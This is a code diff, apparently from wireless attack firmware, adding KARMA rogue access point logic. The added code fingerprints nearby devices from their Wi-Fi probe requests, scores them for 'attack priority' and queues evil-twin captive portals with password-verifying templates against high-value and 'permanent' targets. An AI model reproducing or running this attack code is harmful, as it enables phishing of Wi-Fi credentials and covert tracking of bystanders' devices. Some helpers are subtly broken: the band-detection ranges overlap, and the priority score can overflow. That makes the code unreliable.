@@ -61,6 +61,11 @@ static void copyStringToBuffer(char *dest, size_t destSize, const String &src);
 static bool probeSSIDEquals(const ProbeRequest &probe, const char *value);
 static bool probeSSIDEmpty(const ProbeRequest &probe);
 static void freeProbeFrame(ProbeRequest &probe);
+static void analyzeClientBehavior(const ProbeRequest &probe);
+static uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe);
+static AttackTier determineAttackTier(uint8_t priority);
+static uint32_t getPortalDuration(AttackTier tier);
+static int getWiFiBand(int channel);
 
 // Global gKarmaState pointer
 static KarmaRuntimeState *gKarmaState = nullptr;
@@ -127,6 +132,17 @@ const uint8_t vendorOUIs[][3] PROGMEM = {
     {0x00, 0x1E, 0xE1}, {0x00, 0x13, 0x10}, {0x00, 0x1C, 0xDF}, {0x00, 0x0F, 0xEA},
     {0x00, 0x14, 0x6C}, {0x00, 0x25, 0x9C}, {0x00, 0x11, 0x22}, {0x00, 0x16, 0x6F}
 };
+
+// ============================================================
+// getWiFiBand - Helper function for band detection
+// ============================================================
+
+static int getWiFiBand(int channel) {
+    if (channel >= 1 && channel <= 14) return 0;      // 2.4GHz
+    else if (channel >= 36 && channel <= 165) return 1; // 5GHz
+    else if (channel >= 1 && channel <= 233) return 2;  // 6GHz
+    return 0;  // Default to 2.4GHz
+}
 
 // ============================================================
 // Karma Runtime State - MUST be defined before functions that use it
@@ -1748,7 +1764,175 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
 }
 
 // ============================================================
-// Channel Management (Updated with adaptive hopping)
+// Client Behavior Analysis
+// ============================================================
+
+static void analyzeClientBehavior(const ProbeRequest &probe) {
+    auto it = clientBehaviors.find(probe.fingerprint);
+    
+    String rateKey = String(probe.fingerprint);
+    unsigned long now = millis();
+    if (now - lastRateLimitReset > RATE_LIMIT_WINDOW) {
+        targetRateLimit.clear();
+        lastRateLimitReset = now;
+    }
+    
+    if (targetRateLimit[rateKey] >= karmaConfig.rateLimitPerTarget) {
+        return;
+    }
+    targetRateLimit[rateKey]++;
+
+    if (it == clientBehaviors.end()) {
+        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
+            uint32_t oldestFingerprint = 0;
+            unsigned long oldestTime = UINT32_MAX;
+            for (const auto &pair : clientBehaviors) {
+                if (pair.second.lastSeen < oldestTime) {
+                    oldestTime = pair.second.lastSeen;
+                    oldestFingerprint = pair.first;
+                }
+            }
+            if (oldestFingerprint != 0) { clientBehaviors.erase(oldestFingerprint); }
+        }
+
+        ClientBehavior behavior;
+        behavior.fingerprint = probe.fingerprint;
+        behavior.lastMAC = probe.mac;
+        behavior.firstSeen = probe.timestamp;
+        behavior.lastSeen = probe.timestamp;
+        behavior.probeCount = 1;
+        behavior.avgRSSI = probe.rssi;
+        behavior.probedSSIDs.push_back(probe.ssid);
+        behavior.favoriteChannel = probe.channel;
+        behavior.lastKarmaAttempt = 0;
+        behavior.isVulnerable = (!probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*"));
+        behavior.successfulInteractions = 0;
+        behavior.failedInteractions = 0;
+        behavior.successRate = 0.0f;
+        behavior.consecutiveFailures = 0;
+        behavior.lastSuccessTime = 0;
+        behavior.isPermanentTarget = false;
+        behavior.priorityScore = 0;
+        clientBehaviors[probe.fingerprint] = behavior;
+        uniqueClients++;
+    } else {
+        ClientBehavior &behavior = it->second;
+        behavior.lastSeen = probe.timestamp;
+        behavior.probeCount++;
+        behavior.avgRSSI = (behavior.avgRSSI + probe.rssi) / 2;
+        if (probe.channel >= 1 && probe.channel <= 14) {
+            channelActivity[probe.channel - 1]++;
+            if (channelActivity[probe.channel - 1] > channelActivity[behavior.favoriteChannel - 1])
+                behavior.favoriteChannel = probe.channel;
+        }
+        bool ssidExists = false;
+        for (const auto &existingSSID : behavior.probedSSIDs) {
+            if (existingSSID == probe.ssid) {
+                ssidExists = true;
+                break;
+            }
+        }
+        if (!ssidExists && !probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*") &&
+            behavior.probedSSIDs.size() < 10) {
+            behavior.probedSSIDs.push_back(probe.ssid);
+            if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) behavior.isVulnerable = true;
+        }
+        
+        if (behavior.isVulnerable && behavior.probeCount >= PERMANENT_TARGET_THRESHOLD &&
+            behavior.successRate > 70.0f) {
+            behavior.isPermanentTarget = true;
+            handlePermanentTarget(behavior);
+        }
+    }
+}
+
+static uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe) {
+    uint8_t score = client.priorityScore;
+    
+    if (probe.rssi > -50) score += 30;
+    else if (probe.rssi > -65) score += 20;
+    else if (probe.rssi > -75) score += 10;
+    
+    if (client.probeCount > 10) score += 25;
+    else if (client.probeCount > 5) score += 15;
+    else if (client.probeCount > 2) score += 5;
+    
+    if (client.isVulnerable) score += 20;
+    if (client.isPermanentTarget) score += 30;
+    
+    unsigned long sinceLast = millis() - client.lastSeen;
+    if (sinceLast < 5000) score += 15;
+    else if (sinceLast < 15000) score += 10;
+    else if (sinceLast < 30000) score += 5;
+    
+    if (client.successRate > 70.0f) score += 25;
+    else if (client.successRate > 50.0f) score += 15;
+    
+    if (client.consecutiveFailures > 3) score -= 20;
+    else if (client.consecutiveFailures > 1) score -= 10;
+    
+    if (probeSSIDEquals(probe, "*WILDCARD*")) score = 0;
+    
+    return std::min(score, (uint8_t)255);
+}
+
+static AttackTier determineAttackTier(uint8_t priority) {
+    if (priority >= 200) return TIER_CLONE;
+    if (priority >= 100) return TIER_HIGH;
+    if (priority >= 60) return TIER_MEDIUM;
+    if (priority >= 40) return TIER_FAST;
+    return TIER_NONE;
+}
+
+static uint32_t getPortalDuration(AttackTier tier) {
+    switch (tier) {
+        case TIER_CLONE: return attackConfig.cloneDuration;
+        case TIER_HIGH: return attackConfig.highTierDuration;
+        case TIER_MEDIUM: return attackConfig.mediumTierDuration;
+        case TIER_FAST: return attackConfig.fastTierDuration;
+        default: return attackConfig.mediumTierDuration;
+    }
+}
+
+// ============================================================
+// Permanent Target Handling
+// ============================================================
+
+void handlePermanentTarget(ClientBehavior &client) {
+    if (!karmaConfig.enablePermanentTargets) return;
+    if (!client.isPermanentTarget) return;
+    if (client.successRate < 70.0f) return;
+    
+    if (pendingPortals.size() < MAX_PENDING_PORTALS) {
+        PendingPortal portal;
+        portal.ssid = client.probedSSIDs[0];
+        portal.channel = client.favoriteChannel;
+        portal.targetMAC = client.lastMAC;
+        portal.timestamp = millis();
+        portal.launched = false;
+        portal.templateName = selectedTemplate.name;
+        portal.templateFile = selectedTemplate.filename;
+        portal.isDefaultTemplate = selectedTemplate.isDefault;
+        portal.verifyPassword = selectedTemplate.verifyPassword;
+        portal.priority = 255;
+        portal.tier = TIER_HIGH;
+        portal.duration = attackConfig.highTierDuration * 2;
+        portal.isCloneAttack = false;
+        portal.probeCount = client.probeCount;
+        portal.clientFingerprint = client.fingerprint;
+        portal.isHighValueTarget = true;
+        portal.failureCount = 0;
+        portal.lastAttempt = 0;
+        
+        enqueuePendingPortal(portal, true);
+        
+        Serial.printf("[KARMA] High-value permanent target: %s (FP: %lu, Rate: %.1f%%)\n",
+                     portal.ssid.c_str(), (unsigned long)client.fingerprint, client.successRate);
+    }
+}
+
+// ============================================================
+// Channel Management
 // ============================================================
 
 void updateChannelActivity(uint8_t channel) {
